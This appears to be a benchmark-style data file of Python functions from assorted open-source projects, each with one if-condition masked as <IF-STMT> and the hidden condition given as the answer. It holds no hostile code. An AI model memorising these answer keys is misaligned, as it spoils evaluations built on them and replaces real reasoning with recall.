2170,"def _extract_more_comments(tree):<tab>""""""Return a list of MoreComments objects removed from tree.""""""<tab>more_comments = []<tab>queue = [(None, x) for x in tree]<tab>while len(queue) > 0:<tab><tab>parent, comm = queue.pop(0)<tab><tab><IF-STMT><tab><tab><tab>heappush(more_comments, comm)<tab><tab><tab>if parent:<tab><tab><tab><tab>parent.replies.remove(comm)<tab><tab><tab>else:<tab><tab><tab><tab>tree.remove(comm)<tab><tab>else:<tab><tab><tab>for item in comm.replies:<tab><tab><tab><tab>queue.append((comm, item))<tab>return more_comments","if isinstance ( comm , MoreComments ) :",171
2171,"def run(self):<tab>while True:<tab><tab>self.finished.wait(self.interval)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>try:<tab><tab><tab>self.function(*self.args, **self.kwargs)<tab><tab>except Exception:<tab><tab><tab>if self.bus:<tab><tab><tab><tab>self.bus.log(<tab><tab><tab><tab><tab>""Error in perpetual timer thread function %r."" % self.function,<tab><tab><tab><tab><tab>level=40,<tab><tab><tab><tab><tab>traceback=True,<tab><tab><tab><tab>)<tab><tab><tab># Quit on first error to avoid massive logs.<tab><tab><tab>raise",if self . finished . isSet ( ) :,157
2172,"def emit_classattribs(self, typebld):<tab>if hasattr(self, ""_clrclassattribs""):<tab><tab>for attrib_info in self._clrclassattribs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ci = clr.GetClrType(attrib_info).GetConstructor(())<tab><tab><tab><tab>cab = CustomAttributeBuilder(ci, ())<tab><tab><tab>elif isinstance(attrib_info, CustomAttributeDecorator):<tab><tab><tab><tab>cab = attrib_info.GetBuilder()<tab><tab><tab>else:<tab><tab><tab><tab>make_decorator = attrib_info()<tab><tab><tab><tab>cab = make_decorator.GetBuilder()<tab><tab><tab>typebld.SetCustomAttribute(cab)","if isinstance ( attrib_info , type ) :",166
2173,"def wrapper(fn):<tab>if debug_run_test_calls:<tab><tab>ret = str(fn(*args, *kwargs))<tab><tab>print(""TEST: %s()"" % fn.__name__)<tab><tab>if args:<tab><tab><tab>print(""  arg:"", args)<tab><tab><IF-STMT><tab><tab><tab>print(""  kwa:"", kwargs)<tab><tab>print(""  ret:"", ret)<tab>return fn",if kwargs :,95
2174,"def _prune(self):<tab>with self.lock:<tab><tab>entries = self._list_dir()<tab><tab><IF-STMT><tab><tab><tab>now = time.time()<tab><tab><tab>try:<tab><tab><tab><tab>for i, fpath in enumerate(entries):<tab><tab><tab><tab><tab>remove = False<tab><tab><tab><tab><tab>f = LockedFile(fpath, ""rb"")<tab><tab><tab><tab><tab>exp = pickle.load(f.file)<tab><tab><tab><tab><tab>f.close()<tab><tab><tab><tab><tab>remove = exp <= now or i % 3 == 0<tab><tab><tab><tab><tab>if remove:<tab><tab><tab><tab><tab><tab>self._del_file(fpath)<tab><tab><tab>except Exception:<tab><tab><tab><tab>pass",if len ( entries ) > self . _threshold :,173
2175,"def delete_if_forked(ghrequest):<tab>FORKED = False<tab>query = ""/user/repos""<tab>r = utils.query_request(query)<tab>for repo in r.json():<tab><tab><IF-STMT><tab><tab><tab>if ghrequest.target_repo_fullname in repo[""description""]:<tab><tab><tab><tab>FORKED = True<tab><tab><tab><tab>url = f""/repos/{repo['full_name']}""<tab><tab><tab><tab>utils.query_request(url, method=""DELETE"")<tab>return FORKED","if repo [ ""description"" ] :",127
2176,"def _feed_data_to_buffered_proto(proto, data):<tab>data_len = len(data)<tab>while data_len:<tab><tab>buf = proto.get_buffer(data_len)<tab><tab>buf_len = len(buf)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""get_buffer() returned an empty buffer"")<tab><tab>if buf_len >= data_len:<tab><tab><tab>buf[:data_len] = data<tab><tab><tab>proto.buffer_updated(data_len)<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>buf[:buf_len] = data[:buf_len]<tab><tab><tab>proto.buffer_updated(buf_len)<tab><tab><tab>data = data[buf_len:]<tab><tab><tab>data_len = len(data)",if not buf_len :,189
2177,"def _plugin_get_requirements(self, requirements_iter):<tab>plugin_requirements = {""platform"": [], ""python"": [], ""network"": [], ""native"": []}<tab># parse requirements<tab>for requirement in requirements_iter:<tab><tab>key = requirement[0]<tab><tab>values = requirement[1]<tab><tab>if isinstance(values, str) or isinstance(values, bool):<tab><tab><tab>values = [values]<tab><tab><IF-STMT><tab><tab><tab>plugin_requirements[key].extend(values)<tab><tab>else:<tab><tab><tab>warning(""{}={}: No supported requirement"".format(key, values))<tab>return plugin_requirements",if key in plugin_requirements :,148
2178,"def setCurrentModelIndexes(self, indexes):<tab>self._indexes = []<tab>self._index = None<tab>for i in indexes:<tab><tab>if i.isValid():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>i = i.sibling(i.row(), self._column)<tab><tab><tab>self._indexes.append(i)<tab>self.updateItems()<tab>self.updateSelectedItem()",if i . column ( ) != self . _column :,101
2179,"def _publish(self, data):<tab>retry = True<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._redis_connect()<tab><tab><tab>return self.redis.publish(self.channel, pickle.dumps(data))<tab><tab>except redis.exceptions.ConnectionError:<tab><tab><tab>if retry:<tab><tab><tab><tab>logger.error(""Cannot publish to redis... retrying"")<tab><tab><tab><tab>retry = False<tab><tab><tab>else:<tab><tab><tab><tab>logger.error(""Cannot publish to redis... giving up"")<tab><tab><tab><tab>break",if not retry :,134
2180,"def write_pad_and_flush(self, data, pad="" ""):<tab>if self.encryptor and (data or self.encode_buffer):<tab><tab><IF-STMT><tab><tab><tab>remainder = len(self.encode_buffer) + len(data)<tab><tab><tab>remainder %= self.encode_batches<tab><tab><tab>padding = self.encode_batches - remainder<tab><tab><tab>data += pad * padding<tab>self.write(data)<tab>self.flush()",if self . encode_batches :,110
2181,"def dump_metrics(self):<tab>metrics = self._registry.dump_metrics()<tab># Filter out min and max if there have been no samples.<tab>for metric in metrics.itervalues():<tab><tab><IF-STMT><tab><tab><tab>if ""min"" in metric:<tab><tab><tab><tab>metric[""min""] = 0.0<tab><tab><tab>if ""max"" in metric:<tab><tab><tab><tab>metric[""max""] = 0.0<tab>return metrics","if metric . get ( ""count"" ) == 0 :",109
2182,"def demo():<tab>d = StatusProgressDialog(""A Demo"", ""Doing something..."")<tab>import win32api<tab>for i in range(100):<tab><tab>if i == 50:<tab><tab><tab>d.SetText(""Getting there..."")<tab><tab><IF-STMT><tab><tab><tab>d.SetText(""Nearly done..."")<tab><tab>win32api.Sleep(20)<tab><tab>d.Tick()<tab>d.Close()",if i == 90 :,99
2183,"def get_file_contents(app_name: str, app_version: str, file_path: str):<tab>full_path = f""{app_name}/{app_version}/{file_path}""<tab>success, contents = await MinioApi.get_file(app_name, app_version, file_path)<tab>if success:<tab><tab>return contents<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise DoesNotExistException(""read"", ""file"", full_path)<tab><tab>else:<tab><tab><tab>raise InvalidInputException(<tab><tab><tab><tab>""read"", ""file"", full_path, errors={""error"": contents}<tab><tab><tab>)",if contents is None :,153
2184,"def _sashMark(self, event):<tab>self._sashIndex = -1<tab>try:<tab><tab>self._sashIndex, which = self.paneframe.identify(event.x, event.y)<tab><tab><IF-STMT><tab><tab><tab>self._sashx = [<tab><tab><tab><tab>self.paneframe.sash_coord(i)[0] for i in range(len(self._lists) - 1)<tab><tab><tab>]<tab><tab><tab>self._sashdx = self._sashx[self._sashIndex] - event.x<tab><tab><tab>self._sashDrag(event)<tab><tab>else:<tab><tab><tab>self._sashIndex = -1<tab>except:<tab><tab>return<tab>return ""break""","if which == ""sash"" :",181
2185,"def emptyTree(self):<tab>for child in self:<tab><tab>childObj = child.getObject()<tab><tab>del childObj[NameObject(""/Parent"")]<tab><tab><IF-STMT><tab><tab><tab>del childObj[NameObject(""/Next"")]<tab><tab>if NameObject(""/Prev"") in childObj:<tab><tab><tab>del childObj[NameObject(""/Prev"")]<tab>if NameObject(""/Count"") in self:<tab><tab>del self[NameObject(""/Count"")]<tab>if NameObject(""/First"") in self:<tab><tab>del self[NameObject(""/First"")]<tab>if NameObject(""/Last"") in self:<tab><tab>del self[NameObject(""/Last"")]","if NameObject ( ""/Next"" ) in childObj :",155
2186,"def contractIfNotCurrent(c, p, leaveOpen):<tab>if p == leaveOpen or not p.isAncestorOf(leaveOpen):<tab><tab>p.contract()<tab>for child in p.children():<tab><tab><IF-STMT><tab><tab><tab>contractIfNotCurrent(c, child, leaveOpen)<tab><tab>else:<tab><tab><tab>for p2 in child.self_and_subtree():<tab><tab><tab><tab>p2.contract()",if child != leaveOpen and child . isAncestorOf ( leaveOpen ) :,119
2187,"def test_cat(shape, cat_dim, split, dim):<tab>assert sum(split) == shape[cat_dim]<tab>gaussian = random_gaussian(shape, dim)<tab>parts = []<tab>end = 0<tab>for size in split:<tab><tab>beg, end = end, end + size<tab><tab>if cat_dim == -1:<tab><tab><tab>part = gaussian[..., beg:end]<tab><tab>elif cat_dim == -2:<tab><tab><tab>part = gaussian[..., beg:end, :]<tab><tab><IF-STMT><tab><tab><tab>part = gaussian[:, beg:end]<tab><tab>else:<tab><tab><tab>raise ValueError<tab><tab>parts.append(part)<tab>actual = Gaussian.cat(parts, cat_dim)<tab>assert_close_gaussian(actual, gaussian)",elif cat_dim == 1 :,186
2188,"def _remove_timeout(self, key):<tab>if key in self.waiting:<tab><tab>request, callback, timeout_handle = self.waiting[key]<tab><tab><IF-STMT><tab><tab><tab>self.io_loop.remove_timeout(timeout_handle)<tab><tab>del self.waiting[key]",if timeout_handle is not None :,79
2189,"def gyro(self, mapper, *pyr):<tab>for i in (0, 1, 2):<tab><tab>axis = self.axes[i]<tab><tab># 'gyro' cannot map to mouse, but 'mouse' does that.<tab><tab><IF-STMT><tab><tab><tab>mapper.gamepad.axisEvent(<tab><tab><tab><tab>axis, AxisAction.clamp_axis(axis, pyr[i] * self.speed[i] * -10)<tab><tab><tab>)<tab><tab><tab>mapper.syn_list.add(mapper.gamepad)",if axis in Axes or type ( axis ) == int :,136
2190,"def check_enums_ATLAS_MACHTYPE(lines):<tab>for i, mach_type in enumerate(ATLAS_MACHTYPE):<tab><tab>got = lines.pop(0).strip()<tab><tab>expect = ""{0} = '{1}'"".format(i, mach_type)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""ATLAS_MACHTYPE mismatch at position ""<tab><tab><tab><tab>+ str(i)<tab><tab><tab><tab>+ "": got >>""<tab><tab><tab><tab>+ got<tab><tab><tab><tab>+ ""<<, expected >>""<tab><tab><tab><tab>+ expect<tab><tab><tab><tab>+ ""<<""<tab><tab><tab>)",if got != expect :,154
2191,"def readArgs(self, node):<tab>res = {}<tab>for c in self.getChildrenOf(node):<tab><tab>val = c.getAttribute(""val"")<tab><tab>if val in self.modules:<tab><tab><tab>res[str(c.nodeName)] = self.modules[val]<tab><tab><IF-STMT><tab><tab><tab>res[str(c.nodeName)] = self.mothers[val]<tab><tab>elif val != """":<tab><tab><tab>res[str(c.nodeName)] = eval(val)<tab>return res",elif val in self . mothers :,130
2192,"def submit_events(self, events):<tab>headers = {""Content-Type"": ""application/json""}<tab>event_chunk_size = self.event_chunk_size<tab>for chunk in chunks(events, event_chunk_size):<tab><tab>payload = {<tab><tab><tab>""apiKey"": self.api_key,<tab><tab><tab>""events"": {""api"": chunk},<tab><tab><tab>""uuid"": get_uuid(),<tab><tab><tab>""internalHostname"": get_hostname(),<tab><tab>}<tab><tab>params = {}<tab><tab><IF-STMT><tab><tab><tab>params[""api_key""] = self.api_key<tab><tab>url = ""%s/intake?%s"" % (self.api_host, urlencode(params))<tab><tab>self.submit_http(url, json.dumps(payload), headers)",if self . api_key :,188
2193,"def rewrite_urls_mygpo(self):<tab># Check if we have to rewrite URLs since the last add<tab>rewritten_urls = self.mygpo_client.get_rewritten_urls()<tab>changed = False<tab>for rewritten_url in rewritten_urls:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for channel in self.channels:<tab><tab><tab>if channel.url == rewritten_url.old_url:<tab><tab><tab><tab>logger.info(""Updating URL of %s to %s"", channel, rewritten_url.new_url)<tab><tab><tab><tab>channel.url = rewritten_url.new_url<tab><tab><tab><tab>channel.save()<tab><tab><tab><tab>changed = True<tab><tab><tab><tab>break<tab>if changed:<tab><tab>util.idle_add(self.update_episode_list_model)",if not rewritten_url . new_url :,200
2194,"def validate_hostname(hostname):<tab>if hostname is None or len(hostname) == 0:<tab><tab>return False, ""Empty hostname or domain is not allowed""<tab>fields = hostname.split(""."")<tab>for field in fields:<tab><tab>if not field:<tab><tab><tab>return False, ""Empty hostname or domain is not allowed""<tab><tab><IF-STMT><tab><tab><tab>return False, ""Hostname or domain should not start or end with '-'""<tab>machinename = fields[0]<tab>if len(machinename) > 64 or not machinename[0].isalpha():<tab><tab>return False, ""Hostname should start with alpha char and <= 64 chars""<tab>return True, None","if field [ 0 ] == ""-"" or field [ - 1 ] == ""-"" :",166
2195,"def apply_to(cls, lexer):<tab># Apply a font for all styles<tab>lexer.setFont(Font().load())<tab>for name, font in cls.__dict__.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if hasattr(lexer, name):<tab><tab><tab>style_num = getattr(lexer, name)<tab><tab><tab>lexer.setColor(QColor(font.color), style_num)<tab><tab><tab>lexer.setEolFill(True, style_num)<tab><tab><tab>lexer.setPaper(QColor(font.paper), style_num)<tab><tab><tab>lexer.setFont(font.load(), style_num)","if not isinstance ( font , Font ) :",158
2196,"def dr_relation(self, C, trans, nullable):<tab>state, N = trans<tab>terms = []<tab>g = self.lr0_goto(C[state], N)<tab>for p in g:<tab><tab>if p.lr_index < p.len - 1:<tab><tab><tab>a = p.prod[p.lr_index + 1]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if a not in terms:<tab><tab><tab><tab><tab>terms.append(a)<tab># This extra bit is to handle the start state<tab>if state == 0 and N == self.grammar.Productions[0].prod[0]:<tab><tab>terms.append(""$end"")<tab>return terms",if a in self . grammar . Terminals :,167
2197,"def process_module(name, module, parent):<tab>if parent:<tab><tab>modules[parent][""items""].append(name)<tab><tab>mg = module_groups.setdefault(name, [])<tab><tab>mg.append(parent)<tab><tab><IF-STMT><tab><tab><tab>module["".group""] = parent<tab># check module content<tab>for k, v in list(module.items()):<tab><tab>if k.startswith(""on_click""):<tab><tab><tab># on_click event<tab><tab><tab>process_onclick(k, v, name)<tab><tab><tab># on_click should not be passed to the module via the config.<tab><tab><tab>del module[k]<tab><tab>if isinstance(v, ModuleDefinition):<tab><tab><tab># we are a container<tab><tab><tab>module[""items""] = []<tab>return module","if get_module_type ( name ) == ""py3status"" :",198
2198,"def GetQualifiedWsdlName(type):<tab>with _lazyLock:<tab><tab>wsdlNSAndName = _wsdlNameMap.get(type)<tab><tab><IF-STMT><tab><tab><tab>return wsdlNSAndName<tab><tab>else:<tab><tab><tab>if issubclass(type, list):<tab><tab><tab><tab>ns = GetWsdlNamespace(type.Item._version)<tab><tab><tab><tab>return (ns, ""ArrayOf"" + Capitalize(type.Item._wsdlName))<tab><tab><tab>else:<tab><tab><tab><tab>ns = GetWsdlNamespace(type._version)<tab><tab><tab><tab>return (ns, type._wsdlName)",if wsdlNSAndName :,158
2199,"def assert_tensors_equal(sess, t1, t2, n):<tab>""""""Compute tensors `n` times and ensure that they are equal.""""""<tab>for _ in range(n):<tab><tab>v1, v2 = sess.run([t1, t2])<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>if not np.all(v1 == v2):<tab><tab><tab>return False<tab>return True",if v1 . shape != v2 . shape :,107
2200,"def _lxml_default_loader(href, parse, encoding=None, parser=None):<tab>if parse == ""xml"":<tab><tab>data = etree.parse(href, parser).getroot()<tab>else:<tab><tab>if ""://"" in href:<tab><tab><tab>f = urlopen(href)<tab><tab>else:<tab><tab><tab>f = open(href, ""rb"")<tab><tab>data = f.read()<tab><tab>f.close()<tab><tab><IF-STMT><tab><tab><tab>encoding = ""utf-8""<tab><tab>data = data.decode(encoding)<tab>return data",if not encoding :,133
2201,"def range_f(begin, end, step):<tab># like range, but works on non-integer too<tab>seq = []<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if step < 0 and begin < end:<tab><tab><tab>break<tab><tab>seq.append(begin)<tab><tab>begin = begin + step<tab>return seq",if step > 0 and begin > end :,90
2202,"def _get_seccomp_whitelist(self):<tab>whitelist = [False] * MAX_SYSCALL_NUMBER<tab>index = _SYSCALL_INDICIES[NATIVE_ABI]<tab>for i in range(SYSCALL_COUNT):<tab><tab># Ensure at least one syscall traps.<tab><tab># Otherwise, a simple assembly program could terminate without ever trapping.<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>handler = self._security.get(i, DISALLOW)<tab><tab>for call in translator[i][index]:<tab><tab><tab>if call is None:<tab><tab><tab><tab>continue<tab><tab><tab>if isinstance(handler, int):<tab><tab><tab><tab>whitelist[call] = handler == ALLOW<tab>return whitelist","if i in ( sys_exit , sys_exit_group ) :",185
2203,"def add_custom_versions(versions):<tab>""""""create custom versions strings""""""<tab>versions_dict = {}<tab>for tech, version in versions.items():<tab><tab># clean up ""-"" from version<tab><tab>if ""-"" in version:<tab><tab><tab>version = version.split(""-"")[0]<tab><tab><IF-STMT><tab><tab><tab>version = version[1:]  # Remove the 'v' prefix<tab><tab><tab>versions_dict[tech + ""_numeric""] = version.split(""+"")[0]<tab><tab><tab># ""3.3.0.33"" is what we have, we want ""3.3""<tab><tab><tab>versions_dict[tech + ""_short""] = ""{}.{}"".format(*version.split("".""))<tab>return versions_dict","if version . startswith ( ""v"" ) :",167
2204,"def detab(self, text):<tab>""""""Remove a tab from the front of each line of the given text.""""""<tab>newtext = []<tab>lines = text.split(""\n"")<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>newtext.append(line[self.tab_length :])<tab><tab>elif not line.strip():<tab><tab><tab>newtext.append("""")<tab><tab>else:<tab><tab><tab>break<tab>return ""\n"".join(newtext), ""\n"".join(lines[len(newtext) :])","if line . startswith ( "" "" * self . tab_length ) :",134
2205,"def ignore_module(module):<tab>result = False<tab>for check in ignore_these:<tab><tab>if ""/*"" in check:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab>if (os.getcwd() + ""/"" + check + "".py"") == module:<tab><tab><tab><tab>result = True<tab>if result:<tab><tab>print_warning(""Ignoring module: "" + module)<tab>return result",if check [ : - 1 ] in module :,108
2206,def load_previous_values(self):<tab>ReportOptions.load_previous_values(self)<tab># Pass the loaded values to the menu options so they will be displayed<tab># properly.<tab>for optname in self.options_dict:<tab><tab>menu_option = self.menu.get_option_by_name(optname)<tab><tab><IF-STMT><tab><tab><tab>menu_option.set_value(self.options_dict[optname]),if menu_option :,104
2207,"def dequeue(self):<tab>with self.db(commit=True) as curs:<tab><tab>curs.execute(<tab><tab><tab>""select id, data from task where queue = ? ""<tab><tab><tab>""order by priority desc, id limit 1"",<tab><tab><tab>(self.name,),<tab><tab>)<tab><tab>result = curs.fetchone()<tab><tab><IF-STMT><tab><tab><tab>tid, data = result<tab><tab><tab>curs.execute(""delete from task where id = ?"", (tid,))<tab><tab><tab>if curs.rowcount == 1:<tab><tab><tab><tab>return to_bytes(data)",if result is not None :,138
2208,"def _collect_sublayers_attr(self, attr):<tab>if attr not in [""trainable_weights"", ""nontrainable_weights""]:<tab><tab>raise ValueError(<tab><tab><tab>""Only support to collect some certain attributes of nested layers,""<tab><tab><tab>""e.g. 'trainable_weights', 'nontrainable_weights', but got {}"".format(attr)<tab><tab>)<tab>if self._layers is None:<tab><tab>return []<tab>nested = []<tab>for layer in self._layers:<tab><tab>value = getattr(layer, attr)<tab><tab><IF-STMT><tab><tab><tab>nested.extend(value)<tab>return nested",if value is not None :,146
2209,"def DeleteTab(self, tab):<tab>tab_renderer = self.tabs[tab]<tab>was_selected = tab_renderer.GetSelected()<tab>self.tabs.remove(tab_renderer)<tab>if tab_renderer:<tab><tab>del tab_renderer<tab># determine our new selection<tab>if was_selected and self.GetTabsCount() > 0:<tab><tab><IF-STMT><tab><tab><tab>self.tabs[self.GetTabsCount() - 1].SetSelected(True)<tab><tab>else:<tab><tab><tab>self.tabs[tab].SetSelected(True)<tab>self.AdjustTabsSize()<tab>self.Refresh()",if tab > self . GetTabsCount ( ) - 1 :,158
2210,"def _show_warnings(self):<tab>if self._warnings_handled:<tab><tab>return<tab>self._warnings_handled = True<tab>if self._result and (self._result.has_next or not self._result.warning_count):<tab><tab>return<tab>ws = self._get_db().show_warnings()<tab>if ws is None:<tab><tab>return<tab>for w in ws:<tab><tab>msg = w[-1]<tab><tab><IF-STMT><tab><tab><tab>if isinstance(msg, unicode):<tab><tab><tab><tab>msg = msg.encode(""utf-8"", ""replace"")<tab><tab>warnings.warn(err.Warning(*w[1:3]), stacklevel=4)",if PY2 :,158
2211,"def fetch():<tab>retval = {}<tab>content = retrieve_content(__url__)<tab>if __check__ not in content:<tab><tab>content = retrieve_content(__backup__)<tab>if __check__ in content:<tab><tab>for line in content.split(""\n""):<tab><tab><tab>line = line.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>retval[line] = (__info__, __reference__)<tab>return retval","if not line or line . startswith ( ""#"" ) or ""."" not in line :",114
2212,"def findUserByAttr(self, identifier, attr_type, attr_data):<tab>for uid in self.users_info:<tab><tab>attrs = self.users_info[uid]<tab><tab>for attr in attrs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return defer.succeed(uid)<tab>uid = self.nextId()<tab>self.db.insertTestData([User(uid=uid, identifier=identifier)])<tab>self.db.insertTestData(<tab><tab>[UserInfo(uid=uid, attr_type=attr_type, attr_data=attr_data)]<tab>)<tab>return defer.succeed(uid)","if attr_type == attr [ ""attr_type"" ] and attr_data == attr [ ""attr_data"" ] :",167
2213,"def order_note_added_event(*, order: Order, user: UserType, message: str) -> OrderEvent:<tab>kwargs = {}<tab>if user is not None and not user.is_anonymous:<tab><tab><IF-STMT><tab><tab><tab>account_events.customer_added_to_note_order_event(<tab><tab><tab><tab>user=user, order=order, message=message<tab><tab><tab>)<tab><tab>kwargs[""user""] = user<tab>return OrderEvent.objects.create(<tab><tab>order=order,<tab><tab>type=OrderEvents.NOTE_ADDED,<tab><tab>parameters={""message"": message},<tab><tab>**kwargs,<tab>)",if order . user is not None and order . user . pk == user . pk :,161
2214,"def __str__(self):<tab>if self.team:<tab><tab><IF-STMT><tab><tab><tab>return ""(%s, %s, Q%d, %d and %d) %s"" % (<tab><tab><tab><tab>self.team,<tab><tab><tab><tab>self.data[""yrdln""],<tab><tab><tab><tab>self.time.qtr,<tab><tab><tab><tab>self.down,<tab><tab><tab><tab>self.yards_togo,<tab><tab><tab><tab>self.desc,<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return ""(%s, %s, Q%d) %s"" % (<tab><tab><tab><tab>self.team,<tab><tab><tab><tab>self.data[""yrdln""],<tab><tab><tab><tab>self.time.qtr,<tab><tab><tab><tab>self.desc,<tab><tab><tab>)<tab>return self.desc",if self . down != 0 :,199
2215,"def write(self, stream):<tab>self.write1(stream)<tab>i = 0<tab>n = 0<tab>for name, offset, value, bsize in self.variables:<tab><tab>stream.write(self.body[i:offset])<tab><tab><IF-STMT><tab><tab><tab>write_uint(stream, value)<tab><tab>elif bsize == 8:<tab><tab><tab>write_ulong(stream, value)<tab><tab>else:<tab><tab><tab>raise NotImplementedError()<tab><tab>n += offset - i + bsize<tab><tab>i = offset + bsize<tab>stream.write(self.body[i:])<tab>n += len(self.body) - i<tab>assert n == len(self.body)",if bsize == 4 :,162
2216,"def __setattr__(self, attr, val):<tab>if hasattr(self, attr):<tab><tab>old = getattr(self, attr)<tab><tab><IF-STMT><tab><tab><tab>if isinstance(val, Setting):<tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>""Attempting to reassign setting %s with %s"" % (old, val)<tab><tab><tab><tab>)<tab><tab><tab>log.warn(""Setting attr %s via __setattr__ instead of set()!"", attr)<tab><tab><tab>return old.set(val)<tab>log.debug(""Setting {%s => %s}"" % (attr, val))<tab>return object.__setattr__(self, attr, val)","if isinstance ( old , Setting ) :",155
2217,"def setup_release_cwd_hook(prompter, history, completer, bindings, **kw):<tab>if ON_WINDOWS and not ON_CYGWIN and not ON_MSYS:<tab><tab>prompter.prompt = _cwd_release_wrapper(prompter.prompt)<tab><tab><IF-STMT><tab><tab><tab># Temporarily restore cwd for callbacks to the completer<tab><tab><tab>completer.completer.complete = _cwd_restore_wrapper(<tab><tab><tab><tab>completer.completer.complete<tab><tab><tab>)",if completer . completer :,112
2218,"def nested_update(org_dict, upd_dict):<tab>for key, value in upd_dict.items():<tab><tab><IF-STMT><tab><tab><tab>if key in org_dict:<tab><tab><tab><tab>if not isinstance(org_dict[key], dict):<tab><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab><tab>""Mismatch between org_dict and upd_dict at node {}"".format(key)<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>nested_update(org_dict[key], value)<tab><tab><tab>else:<tab><tab><tab><tab>org_dict[key] = value<tab><tab>else:<tab><tab><tab>org_dict[key] = value","if isinstance ( value , dict ) :",161
2219,"def get_field_by_name(obj, field):<tab># Dereference once<tab>if obj.type.code == gdb.TYPE_CODE_PTR:<tab><tab>obj = obj.dereference()<tab>for f in re.split(""(->|\.|\[\d+\])"", field):<tab><tab>if not f:<tab><tab><tab>continue<tab><tab>if f == ""->"":<tab><tab><tab>obj = obj.dereference()<tab><tab>elif f == ""."":<tab><tab><tab>pass<tab><tab><IF-STMT><tab><tab><tab>n = int(f.strip(""[]""))<tab><tab><tab>obj = obj.cast(obj.dereference().type.pointer())<tab><tab><tab>obj += n<tab><tab><tab>obj = obj.dereference()<tab><tab>else:<tab><tab><tab>obj = obj[f]<tab>return obj","elif f . startswith ( ""["" ) :",189
2220,"def check_sum(self, x, gpu=False):<tab>total = 0<tab>for i in range(5):<tab><tab>t = numpy.array([i], dtype=numpy.int32)<tab><tab><IF-STMT><tab><tab><tab>t = cuda.to_gpu(t)<tab><tab>loss = self.link(chainer.Variable(x), chainer.Variable(t)).data<tab><tab>self.assertEqual(loss.dtype, self.dtype)<tab><tab>self.assertEqual(loss.shape, ())<tab><tab>total += numpy.exp(-cuda.to_cpu(loss))<tab>self.assertAlmostEqual(1.0, float(total), **self.check_sum_options)",if gpu :,157
2221,"def find_node_by_link(node_group, to_node, inp):<tab>for link in node_group.links:<tab><tab>if link.to_node == to_node and link.to_socket == inp:<tab><tab><tab><IF-STMT>  # Step through reroutes<tab><tab><tab><tab>return find_node_by_link(<tab><tab><tab><tab><tab>node_group, link.from_node, link.from_node.inputs[0]<tab><tab><tab><tab>)<tab><tab><tab>return link.from_node","if link . from_node . bl_idname == ""NodeReroute"" :",137
2222,"def _gen_opnds(ii):  # generator<tab># filter out write-mask operands and suppressed operands<tab>for op in ii.parsed_operands:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if op.visibility == ""SUPPRESSED"":<tab><tab><tab>continue<tab><tab>if op.name == ""BCAST"":<tab><tab><tab>continue<tab><tab>yield op","if op . lookupfn_name in [ ""MASK1"" , ""MASKNOT0"" ] :",104
2223,"def contains_trained_model(self):<tab>if not hasattr(self, ""_contains_trained_model""):<tab><tab>for f in self._files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._contains_trained_model = True<tab><tab><tab><tab>self._model_name = f<tab><tab><tab><tab>return self._contains_trained_model<tab><tab>self._contains_trained_model = False<tab><tab>return self._contains_trained_model<tab>else:<tab><tab>return self._contains_trained_model","if "".pt"" in f :",123
2224,"def _call(self, name, *args, **kwargs):<tab>data = self._get_data(name, *args, **kwargs)<tab>is_ascii = self._encoding == ""ascii""<tab>body = json.dumps(data, ensure_ascii=is_ascii).encode(self._encoding)<tab>resp = await self._http.post(self._url, data=body)<tab>if self._full_response:<tab><tab>return resp<tab>else:<tab><tab>content = resp.json()<tab><tab>if resp.is_error:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>resp.raise_for_status()<tab><tab>return self.loads(content)","if ""error"" not in content :",161
2225,"def get_classif_name(classifier_config, usepytorch):<tab>if not usepytorch:<tab><tab>modelname = ""sklearn-LogReg""<tab>else:<tab><tab>nhid = classifier_config[""nhid""]<tab><tab>optim = (<tab><tab><tab>""adam"" if ""optim"" not in classifier_config else classifier_config[""optim""]<tab><tab>)<tab><tab>bs = (<tab><tab><tab>64<tab><tab><tab><IF-STMT><tab><tab><tab>else classifier_config[""batch_size""]<tab><tab>)<tab><tab>modelname = ""pytorch-MLP-nhid%s-%s-bs%s"" % (nhid, optim, bs)<tab>return modelname","if ""batch_size"" not in classifier_config",165
2226,"def on_fill(self, order: Order, exchange: ""Exchange"", trade: ""Trade""):<tab>if trade.order_id in self._executed and trade not in self._trades:<tab><tab>self._trades[trade.order_id] = self._trades.get(trade.order_id, [])<tab><tab>self._trades[trade.order_id] += [trade]<tab><tab>if order.is_complete():<tab><tab><tab>next_order = order.complete(exchange)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.submit(next_order)",if next_order :,143
2227,"def _create_examples(cls, lines, set_type):<tab>examples = []<tab>for (i, line) in enumerate(lines):<tab><tab># Skip the header (first line)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>segments = line.strip().split(""\t"")<tab><tab>idx, text_a, text_b, label = segments<tab><tab>examples.append(<tab><tab><tab>Example(<tab><tab><tab><tab>guid=""%s-%s"" % (set_type, idx),<tab><tab><tab><tab>text_a=text_a,<tab><tab><tab><tab>text_b=text_b,<tab><tab><tab><tab>label=label,<tab><tab><tab>)<tab><tab>)<tab>return examples",if i == 0 :,166
